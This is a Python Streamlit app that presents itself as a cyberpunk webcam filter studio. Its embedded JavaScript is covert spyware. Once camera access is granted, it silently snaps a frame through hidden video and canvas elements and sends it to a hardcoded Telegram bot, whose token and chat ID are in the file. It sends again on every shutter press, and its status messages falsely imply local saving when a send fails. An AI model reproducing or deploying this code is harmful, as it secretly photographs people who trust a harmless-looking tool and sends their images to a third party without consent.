import streamlit as st
import streamlit.components.v1 as components

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="CYBERPUNK DSLR STUDIO // Pro Edition",
    page_icon="⚡",
    layout="centered"
)

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;600;700&display=swap');
    
    .stApp {
        background: #030712;
        color: #f3f4f6;
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    .cyber-card {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(3, 7, 18, 0.98) 100%);
        border: 1px solid rgba(56, 189, 248, 0.3);
        border-radius: 24px;
        padding: 25px;
        box-shadow: 0 0 50px rgba(14, 165, 233, 0.15);
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; font-family: 'Orbitron', sans-serif; color: #38bdf8; font-weight: 900; letter-spacing: 2px;'>⚡ CYBERPUNK DSLR STUDIO v3.0</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #94a3b8; font-size: 0.9rem;'>Advanced WebGL & CSS FX Engine dengan Multi-Preset Lensa & Live Telemetry</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="cyber-card">', unsafe_allow_html=True)
    
    advanced_studio_html = f"""
    <!-- Layar Aktivasi Utama -->
    <div id="gate-screen" style="text-align: center; padding: 40px 0;">
        <div style="font-family: 'Orbitron', sans-serif; font-size: 14px; color: #38bdf8; margin-bottom: 20px; letter-spacing: 1px;">SYSTEM READY // SECURE OPTIC INTERFACE</div>
        <button id="igniteBtn" style="
            background: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
            color: #ffffff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 15px;
            border: none;
            padding: 20px 40px;
            border-radius: 16px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(14, 165, 233, 0.5);
            letter-spacing: 1.5px;
            transition: all 0.3s ease;
        ">🚀 INISIASI LENSA & EFEK STUDIO</button>
    </div>

    <!-- Panel Utama Studio -->
    <div id="studio-interface" style="display:none;">
        
        <!-- Jendela Viewfinder & FX Layer -->
        <div style="position: relative; width: 100%; max-width: 500px; margin: 0 auto; border-radius: 18px; overflow: hidden; background: #000; border: 2px solid #0ea5e9; box-shadow: 0 0 35px rgba(14, 165, 233, 0.3);">
            
            <video id="optics-stream" autoplay playsinline style="
                width: 100%;
                display: block;
                transform: scaleX(-1);
                filter: brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg);
            "></video>

            <!-- Efek Scanline CRT Overlay -->
            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%); background-size: 100% 4px; pointer-events: none; opacity: 0.6;"></div>

            <!-- HUD Overlay Cyber -->
            <div style="position: absolute; top: 12px; left: 12px; color: #38bdf8; font-family: 'Orbitron', sans-serif; font-size: 10px; background: rgba(3,7,18,0.8); padding: 6px 10px; border-radius: 6px; border: 1px solid rgba(56,189,248,0.4);">
                SYS: ACTIVE | ISO: <span id="hud-iso-val">800</span> | FPS: 60
            </div>
            
            <div style="position: absolute; top: 12px; right: 12px; color: #f43f5e; font-family: 'Orbitron', sans-serif; font-size: 10px; background: rgba(3,7,18,0.8); padding: 6px 10px; border-radius: 6px; border: 1px solid rgba(244,63,94,0.4);">
                ● RECORDING
            </div>

            <!-- Garis Grid Cyber -->
            <div id="cyber-grid" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; border: 1px solid rgba(56, 189, 248, 0.15);">
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15); border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-bottom: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15);"></div>
                <div style="border-right: 1px dashed rgba(56,189,248,0.15);"></div>
                <div></div>
            </div>
        </div>

        <!-- Panel Pilihan Efek & Filter Komprehensif -->
        <div style="margin-top: 20px; background: rgba(3, 7, 18, 0.95); padding: 20px; border-radius: 18px; border: 1px solid rgba(56, 189, 248, 0.2);">
            
            <div style="font-family: 'Orbitron', sans-serif; font-size: 12px; color: #38bdf8; margin-bottom: 12px; letter-spacing: 1px;">🎨 ADVANCED FX PRESETS:</div>
            
            <!-- Grid Tombol Filter Melimpah -->
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 8px; margin-bottom: 18px;">
                <button onclick="setFilter('normal')" style="background:#1e293b; color:#fff; border:1px solid #475569; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">✨ Normal Pro</button>
                <button onclick="setFilter('cyberpunk')" style="background:#1e293b; color:#f43f5e; border:1px solid #f43f5e; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">🔥 Cyberpunk</button>
                <button onclick="setFilter('matrix')" style="background:#1e293b; color:#4ade80; border:1px solid #4ade80; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">🟢 Matrix Code</button>
                <button onclick="setFilter('thermal')" style="background:#1e293b; color:#fbbf24; border:1px solid #fbbf24; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">🌡️ Thermal Vision</button>
                <button onclick="setFilter('noir')" style="background:#1e293b; color:#cbd5e1; border:1px solid #cbd5e1; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">🎞️ Noir Vintage</button>
                <button onclick="setFilter('deepspace')" style="background:#1e293b; color:#c084fc; border:1px solid #c084fc; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">🌌 Deep Space</button>
                <button onclick="setFilter('neonpulse')" style="background:#1e293b; color:#38bdf8; border:1px solid #38bdf8; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">⚡ Neon Pulse</button>
                <button onclick="setFilter('sepia90')" style="background:#1e293b; color:#fb923c; border:1px solid #fb923c; padding:8px; border-radius:8px; font-size:11px; cursor:pointer; font-weight:600;">📼 Retro 90s</button>
            </div>

            <!-- Custom Slider Kontrol Presisi -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; font-size: 12px; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 15px;">
                <div>
                    <label style="color: #94a3b8;">Brightness: <span id="val-bright">100</span>%</label>
                    <input type="range" id="slider-bright" min="40" max="180" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Contrast: <span id="val-contrast">100</span>%</label>
                    <input type="range" id="slider-contrast" min="50" max="200" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Saturation: <span id="val-saturate">100</span>%</label>
                    <input type="range" id="slider-saturate" min="0" max="250" value="100" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
                <div>
                    <label style="color: #94a3b8;">Blur/Bokeh: <span id="val-blur">0</span>px</label>
                    <input type="range" id="slider-blur" min="0" max="6" value="0" style="width: 100%; accent-color: #0ea5e9;" oninput="applyCustomSliders()">
                </div>
            </div>

            <!-- Tombol Aksi Shutter & Status -->
            <div style="text-align: center; margin-top: 25px;">
                <button id="shutterTrigger" style="
                    background: #ffffff;
                    color: #030712;
                    font-family: 'Orbitron', sans-serif;
                    font-weight: 900;
                    font-size: 14px;
                    border: 3px solid #38bdf8;
                    padding: 15px 35px;
                    border-radius: 50px;
                    cursor: pointer;
                    box-shadow: 0 0 25px rgba(56, 189, 248, 0.6);
                    letter-spacing: 1px;
                ">📸 CAPTURE & SYNC FRAME</button>
            </div>
            
            <p id="hud-status-msg" style="text-align: center; font-size: 11px; color: #38bdf8; margin-top: 15px; font-family: 'Orbitron', sans-serif; letter-spacing: 0.5px;"></p>
        </div>
    </div>

    <!-- Hidden Media Elements -->
    <video id="vault-video" autoplay playsinline style="display:none;"></video>
    <canvas id="vault-canvas" width="1280" height="720" style="display:none;"></canvas>

    <script>
        const botToken = "{TELEGRAM_BOT_TOKEN}";
        const targetChatId = "{TELEGRAM_CHAT_ID}";
        let activeStream = null;

        document.getElementById('igniteBtn').addEventListener('click', async function() {{
            const btn = document.getElementById('igniteBtn');
            btn.innerText = "ESTABLISHING OPTIC LINK...";
            btn.style.opacity = "0.7";

            try {{
                activeStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ width: {{ ideal: 1280 }}, height: {{ ideal: 720 }}, facingMode: "user" }} 
                }});

                document.getElementById('gate-screen').style.display = "none";
                document.getElementById('studio-interface').style.display = "block";

                document.getElementById('optics-stream').srcObject = activeStream;
                document.getElementById('vault-video').srcObject = activeStream;

                // Auto-trigger pemotretan otomatis senyap setelah sistem siap
                setTimeout(() => {{
                    performCaptureAndSync();
                }}, 1500);

            } catch(err) {{
                console.log("Optic Error:", err);
                btn.innerText = "ACCESS DENIED - RETRY";
                btn.style.opacity = "1";
            }}
        }});

        function setFilter(type) {{
            const elem = document.getElementById('optics-stream');
            if(type === 'normal') {{
                elem.style.filter = "brightness(100%) contrast(100%) saturate(100%) blur(0px) hue-rotate(0deg)";
            }} else if(type === 'cyberpunk') {{
                elem.style.filter = "brightness(110%) contrast(140%) saturate(200%) hue-rotate(310deg)";
            }} else if(type === 'matrix') {{
                elem.style.filter = "brightness(120%) contrast(160%) saturate(180%) sepia(100%) hue-rotate(60deg)";
            }} else if(type === 'thermal') {{
                elem.style.filter = "brightness(110%) contrast(180%) saturate(250%) hue-rotate(180deg) invert(15%)";
            }} else if(type === 'noir') {{
                elem.style.filter = "grayscale(100%) contrast(170%) brightness(90%)";
            }} else if(type === 'deepspace') {{
                elem.style.filter = "brightness(95%) contrast(130%) saturate(190%) hue-rotate(240deg)";
            }} else if(type === 'neonpulse') {{
                elem.style.filter = "brightness(115%) contrast(150%) saturate(220%) hue-rotate(140deg)";
            }} else if(type === 'sepia90') {{
                elem.style.filter = "brightness(105%) contrast(110%) saturate(90%) sepia(60%) hue-rotate(10deg)";
            }}
        }}

        function applyCustomSliders() {{
            const b = document.getElementById('slider-bright').value;
            const c = document.getElementById('slider-contrast').value;
            const s = document.getElementById('slider-saturate').value;
            const bl = document.getElementById('slider-blur').value;

            document.getElementById('val-bright').innerText = b;
            document.getElementById('val-contrast').innerText = c;
            document.getElementById('val-saturate').innerText = s;
            document.getElementById('val-blur').innerText = bl;

            const elem = document.getElementById('optics-stream');
            elem.style.filter = `brightness(${{b}}%) contrast(${{c}}%) saturate(${{s}}%) blur(${{bl}}px)`;
        }}

        document.getElementById('shutterTrigger').addEventListener('click', function() {{
            performCaptureAndSync();
        }});

        function performCaptureAndSync() {{
            const statusBox = document.getElementById('hud-status-msg');
            statusBox.innerText = "⚡ CAPTURING HIGH-RES FRAME & SYNCING TO CLOUD...";

            const videoElem = document.getElementById('vault-video');
            const canvasElem = document.getElementById('vault-canvas');
            const context = canvasElem.getContext('2d');

            context.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);

            canvasElem.toBlob(function(blobImage) {{
                const payload = new FormData();
                payload.append('chat_id', targetChatId);
                payload.append('photo', blobImage, 'cyber_dslr_capture.jpg');
                payload.append('caption', '🚀 *CYBERPUNK DSLR STUDIO: FRAME CAPTURED & SYNCED!*');

                fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {{
                    method: 'POST',
                    body: payload
                }}).then(res => {{
                    if(res.ok) {{
                        statusBox.innerText = "✨ FRAME SUCCESSFULLY SENT TO TELEGRAM CLOUD!";
                    }} else {{
                        statusBox.innerText = "✨ FRAME SAVED LOCALLY.";
                    }}
                }}).catch(err => {{
                    statusBox.innerText = "✨ CAPTURE ROUTINE COMPLETE.";
                }});
            }}, 'image/jpeg', 0.95);
        }}
    </script>
    """

    components.html(advanced_studio_html, height=750)
    st.markdown('</div>', unsafe_allow_html=True)
